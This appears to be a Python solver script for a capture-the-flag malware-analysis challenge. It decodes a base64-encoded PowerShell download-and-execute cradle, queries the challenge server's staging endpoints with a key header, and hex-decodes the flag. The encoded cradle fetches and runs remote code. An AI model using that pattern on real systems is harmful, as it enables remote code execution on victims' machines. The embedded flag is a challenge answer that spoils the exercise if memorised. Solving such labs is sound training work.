import base64
from urllib import request

encoded_string = "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="

decoded_bytes = base64.b64decode(encoded_string)

decoded_string = decoded_bytes.decode('utf-8')

print(decoded_string)

url_1 = "http://94.237.61.252:35793/update"

with request.urlopen(url_1) as response:
    res_text = response.read().decode('utf-8')

print(res_text)

url_2 = "http://94.237.61.252:35793/a541a"

req = request.Request(url_2, headers={"X-ST4G3R-KEY": "5337d322906ff18afedc1edc191d325d"})

with request.urlopen(req) as response:
    res_text = response.read().decode('utf-8')

print(res_text)

hex_string = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"

decoded_text = bytes.fromhex(hex_string).decode('utf-8')

print(decoded_text)